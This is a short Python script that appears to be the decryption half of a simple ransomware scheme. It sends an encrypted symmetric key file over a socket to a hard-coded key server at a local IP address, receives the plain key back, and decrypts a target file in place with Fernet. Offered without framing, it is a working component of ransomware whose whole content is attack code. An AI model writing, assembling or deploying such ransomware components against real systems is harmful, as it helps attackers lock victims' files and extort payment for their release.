from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

import base64
import socket
hostname = "192.168.1.101"
port = "8000"

def sendEncryptedKey(eKeyFilePath):
    with socket.create_connection((hostname, port)) as sock:
        with open(eKeyFilePath, "rb") as file:
           encrypted_key = file.read()
           sock.sendall(encrypted_key)
           key = str(sock.recv(1024), "utf-8")
           return key


def decryptFile(filePath, key):
    FernetInstance = Fernet(key)
    with open(filePath, "rb") as file:
       file_data = file.read()
       decrypted_data = FernetInstance.decrypt(file_data)

    with open(filePath, "wb") as file:
       file.write(decrypted_data)
    pass

eKeyFilePath = "encryptedSymmertricKey.key"
key = sendEncryptedKey(eKeyFilePath)
print(key)
decryptFile("FileToEncrypt.txt", key)